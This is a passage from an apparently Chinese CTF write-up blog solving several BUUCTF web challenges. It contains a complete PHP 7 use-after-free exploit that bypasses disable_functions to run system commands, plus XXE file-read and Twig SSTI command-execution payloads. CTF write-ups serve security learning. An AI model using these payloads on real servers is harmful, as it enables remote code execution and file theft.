</span></span><span class=line><span class=cl>            $address &lt;&lt;= 8;
</span></span><span class=line><span class=cl>            $address |= ord($str[$p+$j]);
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>        return $address;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    function ptr2str($ptr, $m = 8) {
</span></span><span class=line><span class=cl>        $out = &#34;&#34;;
</span></span><span class=line><span class=cl>        for ($i=0; $i &lt; $m; $i++) {
</span></span><span class=line><span class=cl>            $out .= chr($ptr &amp; 0xff);
</span></span><span class=line><span class=cl>            $ptr &gt;&gt;= 8;
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>        return $out;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    function write(&amp;$str, $p, $v, $n = 8) {
</span></span><span class=line><span class=cl>        $i = 0;
</span></span><span class=line><span class=cl>        for($i = 0; $i &lt; $n; $i++) {
</span></span><span class=line><span class=cl>            $str[$p + $i] = chr($v &amp; 0xff);
</span></span><span class=line><span class=cl>            $v &gt;&gt;= 8;
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    function leak($addr, $p = 0, $s = 8) {
</span></span><span class=line><span class=cl>        global $abc, $helper;
</span></span><span class=line><span class=cl>        write($abc, 0x68, $addr + $p - 0x10);
</span></span><span class=line><span class=cl>        $leak = strlen($helper-&gt;a);
</span></span><span class=line><span class=cl>        if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }
</span></span><span class=line><span class=cl>        return $leak;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    function parse_elf($base) {
</span></span><span class=line><span class=cl>        $e_type = leak($base, 0x10, 2);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        $e_phoff = leak($base, 0x20);
</span></span><span class=line><span class=cl>        $e_phentsize = leak($base, 0x36, 2);
</span></span><span class=line><span class=cl>        $e_phnum = leak($base, 0x38, 2);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        for($i = 0; $i &lt; $e_phnum; $i++) {
</span></span><span class=line><span class=cl>            $header = $base + $e_phoff + $i * $e_phentsize;
</span></span><span class=line><span class=cl>            $p_type  = leak($header, 0, 4);
</span></span><span class=line><span class=cl>            $p_flags = leak($header, 4, 4);
</span></span><span class=line><span class=cl>            $p_vaddr = leak($header, 0x10);
</span></span><span class=line><span class=cl>            $p_memsz = leak($header, 0x28);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write
</span></span><span class=line><span class=cl>                # handle pie
</span></span><span class=line><span class=cl>                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
</span></span><span class=line><span class=cl>                $data_size = $p_memsz;
</span></span><span class=line><span class=cl>            } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec
</span></span><span class=line><span class=cl>                $text_size = $p_memsz;
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        if(!$data_addr || !$text_size || !$data_size)
</span></span><span class=line><span class=cl>            return false;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        return [$data_addr, $text_size, $data_size];
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    function get_basic_funcs($base, $elf) {
</span></span><span class=line><span class=cl>        list($data_addr, $text_size, $data_size) = $elf;
</span></span><span class=line><span class=cl>        for($i = 0; $i &lt; $data_size / 8; $i++) {
</span></span><span class=line><span class=cl>            $leak = leak($data_addr, $i * 8);
</span></span><span class=line><span class=cl>            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
</span></span><span class=line><span class=cl>                $deref = leak($leak);
</span></span><span class=line><span class=cl>                # &#39;constant&#39; constant check
</span></span><span class=line><span class=cl>                if($deref != 0x746e6174736e6f63)
</span></span><span class=line><span class=cl>                    continue;
</span></span><span class=line><span class=cl>            } else continue;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            $leak = leak($data_addr, ($i + 4) * 8);
</span></span><span class=line><span class=cl>            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
</span></span><span class=line><span class=cl>                $deref = leak($leak);
</span></span><span class=line><span class=cl>                # &#39;bin2hex&#39; constant check
</span></span><span class=line><span class=cl>                if($deref != 0x786568326e6962)
</span></span><span class=line><span class=cl>                    continue;
</span></span><span class=line><span class=cl>            } else continue;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            return $data_addr + $i * 8;
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    function get_binary_base($binary_leak) {
</span></span><span class=line><span class=cl>        $base = 0;
</span></span><span class=line><span class=cl>        $start = $binary_leak &amp; 0xfffffffffffff000;
</span></span><span class=line><span class=cl>        for($i = 0; $i &lt; 0x1000; $i++) {
</span></span><span class=line><span class=cl>            $addr = $start - 0x1000 * $i;
</span></span><span class=line><span class=cl>            $leak = leak($addr, 0, 7);
</span></span><span class=line><span class=cl>            if($leak == 0x10102464c457f) { # ELF header
</span></span><span class=line><span class=cl>                return $addr;
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    function get_system($basic_funcs) {
</span></span><span class=line><span class=cl>        $addr = $basic_funcs;
</span></span><span class=line><span class=cl>        do {
</span></span><span class=line><span class=cl>            $f_entry = leak($addr);
</span></span><span class=line><span class=cl>            $f_name = leak($f_entry, 0, 6);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            if($f_name == 0x6d6574737973) { # system
</span></span><span class=line><span class=cl>                return leak($addr + 8);
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>            $addr += 0x20;
</span></span><span class=line><span class=cl>        } while($f_entry != 0);
</span></span><span class=line><span class=cl>        return false;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    class ryat {
</span></span><span class=line><span class=cl>        var $ryat;
</span></span><span class=line><span class=cl>        var $chtg;
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        function __destruct()
</span></span><span class=line><span class=cl>        {
</span></span><span class=line><span class=cl>            $this-&gt;chtg = $this-&gt;ryat;
</span></span><span class=line><span class=cl>            $this-&gt;ryat = 1;
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    class Helper {
</span></span><span class=line><span class=cl>        public $a, $b, $c, $d;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    if(stristr(PHP_OS, &#39;WIN&#39;)) {
</span></span><span class=line><span class=cl>        die(&#39;This PoC is for *nix systems only.&#39;);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    $n_alloc = 10; # increase this value if you get segfaults
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    $contiguous = [];
</span></span><span class=line><span class=cl>    for($i = 0; $i &lt; $n_alloc; $i++)
</span></span><span class=line><span class=cl>        $contiguous[] = str_repeat(&#39;A&#39;, 79);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    $poc = &#39;a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:&#34;ryat&#34;:2:{s:4:&#34;ryat&#34;;R:3;s:4:&#34;chtg&#34;;i:2;}}i:1;i:3;i:2;R:5;}&#39;;
</span></span><span class=line><span class=cl>    $out = unserialize($poc);
</span></span><span class=line><span class=cl>    gc_collect_cycles();
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    $v = [];
</span></span><span class=line><span class=cl>    $v[0] = ptr2str(0, 79);
</span></span><span class=line><span class=cl>    unset($v);
</span></span><span class=line><span class=cl>    $abc = $out[2][0];
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    $helper = new Helper;
</span></span><span class=line><span class=cl>    $helper-&gt;b = function ($x) { };
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    if(strlen($abc) == 79 || strlen($abc) == 0) {
</span></span><span class=line><span class=cl>        die(&#34;UAF failed&#34;);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    # leaks
</span></span><span class=line><span class=cl>    $closure_handlers = str2ptr($abc, 0);
</span></span><span class=line><span class=cl>    $php_heap = str2ptr($abc, 0x58);
</span></span><span class=line><span class=cl>    $abc_addr = $php_heap - 0xc8;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    # fake value
</span></span><span class=line><span class=cl>    write($abc, 0x60, 2);
</span></span><span class=line><span class=cl>    write($abc, 0x70, 6);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    # fake reference
</span></span><span class=line><span class=cl>    write($abc, 0x10, $abc_addr + 0x60);
</span></span><span class=line><span class=cl>    write($abc, 0x18, 0xa);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    $closure_obj = str2ptr($abc, 0x20);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    $binary_leak = leak($closure_handlers, 8);
</span></span><span class=line><span class=cl>    if(!($base = get_binary_base($binary_leak))) {
</span></span><span class=line><span class=cl>        die(&#34;Couldn&#39;t determine binary base address&#34;);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    if(!($elf = parse_elf($base))) {
</span></span><span class=line><span class=cl>        die(&#34;Couldn&#39;t parse ELF header&#34;);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
</span></span><span class=line><span class=cl>        die(&#34;Couldn&#39;t get basic_functions address&#34;);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    if(!($zif_system = get_system($basic_funcs))) {
</span></span><span class=line><span class=cl>        die(&#34;Couldn&#39;t get zif_system address&#34;);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    # fake closure object
</span></span><span class=line><span class=cl>    $fake_obj_offset = 0xd0;
</span></span><span class=line><span class=cl>    for($i = 0; $i &lt; 0x110; $i += 8) {
</span></span><span class=line><span class=cl>        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    # pwn
</span></span><span class=line><span class=cl>    write($abc, 0x20, $abc_addr + $fake_obj_offset);
</span></span><span class=line><span class=cl>    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
</span></span><span class=line><span class=cl>    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    ($helper-&gt;b)($cmd);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    exit();
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>在蚁剑可以看出tmp文件夹权限可以上传，上传以后使用文件包含输出执行结果。文件包含payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?Ginkgo=aW5jbHVkZSgnL3RtcC9waHA3LWdjLWJ5cGFzcy5waHAnKTs=
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=0302 class=headerLink><a href=#0302 class=header-mark></a>03.02</h1><hr><h1 id=nctf2019fake-xml-cookbook class=headerLink><a href=#nctf2019fake-xml-cookbook class=header-mark></a>[NCTF2019]Fake XML cookbook</h1><p>根据题目是XML，首先想到是XXE，虽然咱没学过但是可以去搜简单的payload。</p><p>使用bp抓个包，POST中传入的是标签格式，可以确定是XXE类型的题目</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST
</span></span><span class=line><span class=cl>Content-Type: application/xml;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;user&gt;&lt;username&gt;1&lt;/username&gt;&lt;password&gt;2&lt;/password&gt;&lt;/user&gt;
</span></span></code></pre></td></tr></table></div></div><p>去摸一个payload试试</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;
</span></span><span class=line><span class=cl>&lt;!DOCTYPE test [
</span></span><span class=line><span class=cl>  &lt;!ENTITY admin SYSTEM &#34;file:///etc/passwd&#34;&gt;
</span></span><span class=line><span class=cl>  ]&gt;
</span></span><span class=line><span class=cl>&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;
</span></span></code></pre></td></tr></table></div></div><p>成功读取文件</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302110439.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302110439.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302110439.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302110439.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302110439.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302110439.png></p><p>把路径改为/flag，获得flag</p><hr><h1 id=asis-2019unicorn-shop class=headerLink><a href=#asis-2019unicorn-shop class=header-mark></a>[ASIS 2019]Unicorn shop</h1><p>这道题绝活。学到了unicode的安全问题：<a href=https://xz.aliyun.com/t/5402 target=_blank rel="noopener noreffer">浅谈Unicode设计的安全性</a>，看了wp。</p><p>进入网站一个本杰明·富兰克林至理名言：</p><blockquote><p>金钱从来不会使人幸福，也不会使人幸福；它的本性中没有任何东西可以产生幸福。幸福拥有的越多，想要的就越多</p></blockquote><p><del>差点信了，我就要赚钱花(小声bb)</del></p><p>下面两个输入框，一个ID一个钱，上面一个独角兽商品列表，一看就是让买东西，但是1-3商品输入ID都提示错误，只有第四个可以买到，但是第四个输入钱的时候只能输入1位，然鹅4号价格是1377，显然买不到，输入多个又提示 ，所以思路就是找一个unicode字符，它的数字格式值是大于1377的。</p><p>一个和unicode有关的网站：https://www.compart.com/en/unicode</p><p>网站导航栏找到Character Categories分类，这个下有三个和数相关的：Decimal Number、Letter Number、Other Number，第一个里面都是正常数值的unicode，建议去后面两个找。怎么找：Ctrl+F搜索thousand，找1377以上的都可。</p><p>我选的是这个<code>፼</code>数值是1w，直接传传不过去，使用url编码一次再传。</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302113544.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302113544.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302113544.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302113544.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302113544.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302113544.png></p><hr><h1 id=bjdctf2020cookie-is-so-stable class=headerLink><a href=#bjdctf2020cookie-is-so-stable class=header-mark></a>[BJDCTF2020]Cookie is so stable</h1><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210304092035.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210304092035.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210304092035.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210304092035.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210304092035.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210304092035.png></p><p>这道题和The mystery of ip的网站一样，还有可能是ssti，hint.php的注释里有</p><blockquote><p>Why not take a closer look at cookies?</p></blockquote><p>去flag.php提交个1之后，看cookie为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Cookie: PHPSESSID=dba9ac7cbddf1983cbac508b01f8cdf2; user=1
</span></span></code></pre></td></tr></table></div></div><p>一目了然，接下来就是找payload。再使用之前的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{system(&#39;cat /flag&#39;)}
</span></span></code></pre></td></tr></table></div></div><p>被拦下来了，说明加强了过滤。在这之后去看了wp，网上的wp都是直接给出了payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{{_self.env.registerUndefinedFilterCallback(&#34;exec&#34;)}}{{_self.env.getFilter(&#34;whoami&#34;)}}
</span></span></code></pre></td></tr></table></div></div><p>我是受了这位师傅的<a href=https://www.cnblogs.com/bmjoker/p/13508538.html target=_blank rel="noopener noreffer">文章</a>启发，又去结合了下这道题的<a href=https://github.com/BjdsecCA/BJDCTF2020_January/tree/f73ac63336d9161d3c91354ce3eac943c403d4fb/Web/ssti_twig target=_blank rel="noopener noreffer">源码</a>才搞明白。</p><p>这道题在渲染之前使用了twig模板：</p><blockquote><p>Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。Twig使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。</p></blockquote><p>我同样在题目的源码中找到了<code>render()</code>方法和<code>Twig_Environment</code>配置信息</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302160322.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302160322.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302160322.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302160322.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302160322.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302160322.png></p><p>然后payload的具体原理在的<code>Environment.php</code>中,贴一下和payload相关部分：</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302160722.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302160722.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302160722.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302160722.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302160722.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302160722.png></p><ol><li>先执行<code>{{_self.env.registerUndefinedFilterCallback("exec")}}</code>调用了<code>registerUndefinedFilterCallback()</code>函数(图中884行)，注册了一个未定义的函数到<code>filterCallbacks</code>全局变量中</li><li>接着执行<code>{{_self.env.getFilter("whoami")}}</code>调用了<code>getFilter()</code>函数，并传入变量<code>$name</code>值为执行的命令，当函数执行到图中代码875行时，进入循环执行了<code>call_user_func()</code>，这个函数大伙肯定不陌生：call_user_func 可以把第一个参数作为回调函数调用，调用的参数来源就是第一步中注册的<code>filterCallbacks</code>全局变量，里边已经躺好了一个刚刚注册的<code>exec</code>，至此就形成了payload</li></ol><hr><h1 id=小彩蛋 class=headerLink><a href=#%e5%b0%8f%e5%bd%a9%e8%9b%8b class=header-mark></a>小彩蛋</h1><p>现在(2021年3月2日16:32:44)刚好做完题，想回到BUU上整理过程，发现502了，然后去群里就看到了</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302163452.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302163452.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302163452.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302163452.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302163452.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302163452.png></p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302163636.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302163636.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302163636.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302163636.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302163636.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210302163636.png></p><p>挺草的记一下。</p><hr><h1 id=ciscn-2019-初赛love-math class=headerLink><a href=#ciscn-2019-%e5%88%9d%e8%b5%9blove-math class=header-mark></a>[CISCN 2019 初赛]Love Math</h1><p>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>//听说你很喜欢数学，不知道你是否爱它胜过爱flag
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;c&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>//例子 c=20-1
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$content</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;c&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$content</span><span class=p>)</span> <span class=o>&gt;=</span> <span class=mi>80</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;太长了不会算&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nv>$blacklist</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39; &#39;</span><span class=p>,</span> <span class=s1>&#39;\t&#39;</span><span class=p>,</span> <span class=s1>&#39;\r&#39;</span><span class=p>,</span> <span class=s1>&#39;\n&#39;</span><span class=p>,</span><span class=s1>&#39;\&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;&#34;&#39;</span><span class=p>,</span> <span class=s1>&#39;`&#39;</span><span class=p>,</span> <span class=s1>&#39;\[&#39;</span><span class=p>,</span> <span class=s1>&#39;\]&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$blacklist</span> <span class=k>as</span> <span class=nv>$blackitem</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/&#39;</span> <span class=o>.</span> <span class=nv>$blackitem</span> <span class=o>.</span> <span class=s1>&#39;/m&#39;</span><span class=p>,</span> <span class=nv>$content</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s2>&#34;请不要输入奇奇怪怪的字符&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$whitelist</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;abs&#39;</span><span class=p>,</span> <span class=s1>&#39;acos&#39;</span><span class=p>,</span> <span class=s1>&#39;acosh&#39;</span><span class=p>,</span> <span class=s1>&#39;asin&#39;</span><span class=p>,</span> <span class=s1>&#39;asinh&#39;</span><span class=p>,</span> <span class=s1>&#39;atan2&#39;</span><span class=p>,</span> <span class=s1>&#39;atan&#39;</span><span class=p>,</span> <span class=s1>&#39;atanh&#39;</span><span class=p>,</span> <span class=s1>&#39;base_convert&#39;</span><span class=p>,</span> <span class=s1>&#39;bindec&#39;</span><span class=p>,</span> <span class=s1>&#39;ceil&#39;</span><span class=p>,</span> <span class=s1>&#39;cos&#39;</span><span class=p>,</span> <span class=s1>&#39;cosh&#39;</span><span class=p>,</span> <span class=s1>&#39;decbin&#39;</span><span class=p>,</span> <span class=s1>&#39;dechex&#39;</span><span class=p>,</span> <span class=s1>&#39;decoct&#39;</span><span class=p>,</span> <span class=s1>&#39;deg2rad&#39;</span><span class=p>,</span> <span class=s1>&#39;exp&#39;</span><span class=p>,</span> <span class=s1>&#39;expm1&#39;</span><span class=p>,</span> <span class=s1>&#39;floor&#39;</span><span class=p>,</span> <span class=s1>&#39;fmod&#39;</span><span class=p>,</span> <span class=s1>&#39;getrandmax&#39;</span><span class=p>,</span> <span class=s1>&#39;hexdec&#39;</span><span class=p>,</span> <span class=s1>&#39;hypot&#39;</span><span class=p>,</span> <span class=s1>&#39;is_finite&#39;</span><span class=p>,</span> <span class=s1>&#39;is_infinite&#39;</span><span class=p>,</span> <span class=s1>&#39;is_nan&#39;</span><span class=p>,</span> <span class=s1>&#39;lcg_value&#39;</span><span class=p>,</span> <span class=s1>&#39;log10&#39;</span><span class=p>,</span> <span class=s1>&#39;log1p&#39;</span><span class=p>,</span> <span class=s1>&#39;log&#39;</span><span class=p>,</span> <span class=s1>&#39;max&#39;</span><span class=p>,</span> <span class=s1>&#39;min&#39;</span><span class=p>,</span> <span class=s1>&#39;mt_getrandmax&#39;</span><span class=p>,</span> <span class=s1>&#39;mt_rand&#39;</span><span class=p>,</span> <span class=s1>&#39;mt_srand&#39;</span><span class=p>,</span> <span class=s1>&#39;octdec&#39;</span><span class=p>,</span> <span class=s1>&#39;pi&#39;</span><span class=p>,</span> <span class=s1>&#39;pow&#39;</span><span class=p>,</span> <span class=s1>&#39;rad2deg&#39;</span><span class=p>,</span> <span class=s1>&#39;rand&#39;</span><span class=p>,</span> <span class=s1>&#39;round&#39;</span><span class=p>,</span> <span class=s1>&#39;sin&#39;</span><span class=p>,</span> <span class=s1>&#39;sinh&#39;</span><span class=p>,</span> <span class=s1>&#39;sqrt&#39;</span><span class=p>,</span> <span class=s1>&#39;srand&#39;</span><span class=p>,</span> <span class=s1>&#39;tan&#39;</span><span class=p>,</span> 